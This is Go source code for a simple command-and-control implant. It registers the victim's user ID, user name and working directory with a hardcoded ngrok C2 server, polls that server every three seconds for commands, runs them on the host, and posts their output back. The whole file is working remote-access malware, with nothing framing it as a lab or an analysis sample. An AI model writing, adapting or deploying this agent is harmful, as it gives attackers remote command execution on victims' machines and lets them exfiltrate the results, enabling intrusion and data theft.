package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"time"

	"github.com/lithammer/shortuuid"
)

//ok
type Cmd struct {
	ID      string
	Command string
	Agent   string
	Status  string
	Cmdid   string
	Output  string
}

var timeoutSetting = 3
var c2 = "https://e49a4a48f45d.ngrok.io"

//var agent = "test"

func main() {
	uuid := shortuuid.New()
	user, err := user.Current()
	agent := uuid + "_" + user.Uid + "_" + user.Name
	createAgent(agent)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
	}
	timeout := time.Duration(timeoutSetting) * time.Second
	ticker := time.NewTicker(timeout)
	quit := make(chan struct{})
	for {
		select {
		case <-ticker.C:
			path, err := os.Getwd()
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
			}
			fmt.Println(path)
			getJSON(c2 + "/api/cmds/" + agent)
			updateAgentStatus(agent)
		case <-quit:
			return
		}
	}
}

func getJSON(url string) {

	resp, err := http.Get(url)
	if err != nil {
		fmt.Println(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}

	body, readErr := ioutil.ReadAll(resp.Body)
	if readErr != nil {
		log.Fatal(readErr)
	}

	var results []Cmd
	jsonErr := json.Unmarshal(body, &results)
	if jsonErr != nil {
		log.Fatal(jsonErr)
	}

	for _, d := range results {
		fmt.Println(d.Command)
		fmt.Println(d.Cmdid)
		runCommand(d.Command, d.Cmdid)
	}

	// Print the HTTP response status.
	//fmt.Println("Response status:", resp.Status)

}

func runCommand(commandStr string, cmdid string) error {
	commandStr = strings.TrimSuffix(commandStr, "\n")
	arrCommandStr := strings.Fields(commandStr)
	if len(arrCommandStr) < 1 {
		return errors.New("")
	}
	switch arrCommandStr[0] {
	case "cd":
		if len(arrCommandStr) < 1 {
			return errors.New("Required 1 arguments")
		}
		updateCmdStatus(cmdid, arrCommandStr[1])
		os.Chdir(arrCommandStr[1])
		return nil
	case "exit":
		os.Exit(0)
	case "whos":
		out, err := exec.Command("whoami").Output()
		if err != nil {
			fmt.Println(err)
		}
		updateCmdStatus(cmdid, string(out))
		return nil
	default:
		out, err := exec.Command(arrCommandStr[0], arrCommandStr[1:]...).Output()
		if err != nil {
			fmt.Println(err)
		}
		//cmd.Stderr = os.Stderr
		//cmd.Stdout = os.Stdout
		fmt.Println(string(out))
		updateCmdStatus(cmdid, string(out))
		return nil
	}
	return nil
}

func updateCmdStatus(cmdid string, output string) {
	resp, err := http.PostForm(c2+"/api/cmd/update",
		url.Values{"id": {cmdid}, "output": {output}})

	if err != nil {
		panic(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}
}

func updateAgentStatus(agent string) {
	dir, err := os.Getwd()
	resp, err := http.PostForm(c2+"/api/agent/update",
		url.Values{"working": {dir}, "agent": {agent}})

	if err != nil {
		panic(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}
}

func createAgent(agent string) {
	dir, err := os.Getwd()
	resp, err := http.PostForm(c2+"/api/agent/create",
		url.Values{"working": {dir}, "agent": {agent}})

	if err != nil {
		panic(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}
}
